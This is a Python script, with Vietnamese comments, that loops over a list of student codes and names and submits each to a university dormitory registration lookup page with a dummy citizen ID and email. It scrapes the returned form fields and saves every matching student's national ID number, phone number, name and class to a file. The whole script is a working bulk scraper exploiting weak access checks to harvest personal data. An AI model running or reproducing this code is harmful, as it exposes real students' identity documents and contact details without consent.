import requests
from bs4 import BeautifulSoup
import json
#Lấy code và fullname từ file sinh_vien.txt
def read_students_from_txt(file_path):
    students = []
    with open(file_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()
    
    for i in range(0, len(lines), 4):
        code = lines[i].strip()
        fullname = lines[i + 1].strip()
        students.append({"code": code, "fullname": fullname})
    
    return students
# name_file = input("Nhập tên file: ")
file_path = f"sinh_vien 22NS.txt"  # Đổi tên file nếu cần
students_list = read_students_from_txt(file_path)

# URL for the POST request
url = 'https://kytucxa.vku.udn.vn/home/register/find-student-signup'
for i in range(len(students_list)):
    data = {
        'code': students_list[i]['code'],
        'fullname': students_list[i]['fullname'],
        'citizen_id': '111111111111111',
        'email': 'a@a.c'
    }
    try:

        # Send POST request with form data
        response = requests.post(url, data=data)

        # Get the HTML content of the response
        html_doc = response.text
        soup = BeautifulSoup(html_doc, 'html.parser')

        # Assuming the raw data is in an input field with id 'SoCMND', 'MaSinhVien','HoDem','Ten','SDTCaNhan'
        raw_data = {
            'key': soup.find('input', {'id': 'SoCMND'})['value'],
            'value': soup.find('input', {'id': 'MaSinhVien'})['value'],
            'HoDem' : soup.find('input', {'id': 'HoDem'})['value'],
            'Ten' : soup.find('input', {'id': 'Ten'})['value'],
            'SDTCaNhan' : soup.find('input', {'id': 'SDTCaNhan'})['value'],
            'Lop': soup.find('input', {'id': 'Lop'})['value'],
        }
        print(f'Số CMND: {raw_data['key']}')
        print(f'Mã sinh viên: {raw_data['value']}')
        print(f'Họ và tên: {raw_data['HoDem']} {raw_data['Ten']}')
        print(f'Số điện thoại: {raw_data['SDTCaNhan']}')
        print(f'Lớp: {raw_data['Lop']}')
        print('-----------------------------------')
        # xuất dữ liệu ra file txt
        with open(f'tt sinh_vien 22NS.txt', 'a', encoding='utf-8') as f:
            f.write(f"Số CMND: {raw_data['key']}\n")
            f.write(f"Mã sinh viên: {raw_data['value']}\n")
            f.write(f"Họ và tên: {raw_data['HoDem']} {raw_data['Ten']}\n")
            f.write(f"Số điện thoại: {raw_data['SDTCaNhan']}\n")
            f.write("'-----------------------------------'\n")
    except:
        print("Không tìm thấy sinh viên")
        continue
        

